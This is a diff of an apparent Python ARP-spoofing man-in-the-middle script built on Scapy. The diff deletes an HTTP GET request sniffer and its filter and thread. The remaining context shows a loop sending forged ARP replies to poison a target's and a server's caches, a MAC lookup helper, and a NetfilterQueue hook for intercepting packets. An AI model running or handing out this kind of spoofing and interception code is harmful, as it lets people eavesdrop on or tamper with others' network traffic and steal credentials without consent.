@@ -31,13 +31,6 @@ def ARP_loop(tar, ser):
         send(ARP(op=2, pdst=ser, psrc=tar), iface=interface, verbose=False)
         time.sleep(3)
 
-def sniff_sniff():
-    # Sniff for HTTP requests
-    load_layer("http")
-    print(f"\nSniffing Http requests")
-    sniff(lfilter=filter_get_requests, prn=HTTP_callback, store=1)
-    
-
 # Get MAC address for IP
 def get_mac(ip):
     arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
@@ -50,9 +43,6 @@ def get_mac(ip):
 
     return None
 
-# Custom filter for HTTP
-def filter_get_requests(pkt):
-    return pkt.haslayer(HTTPRequest) and pkt[HTTPRequest].Method==b'GET'
 
 # Callback for when receiving a HTTP packet
 def HTTP_callback(packet):
@@ -126,9 +116,6 @@ try:
     thread2.daemon = True
     thread2.start()
     print(f"\nSent ARPs")
-    # thread3 = threading.Thread(target=sniff_sniff)
-    # thread3.daemon = True
-    # thread3.start()
 
     nfqueue = NetfilterQueue()                       
     nfqueue.bind(1, q_callback)    
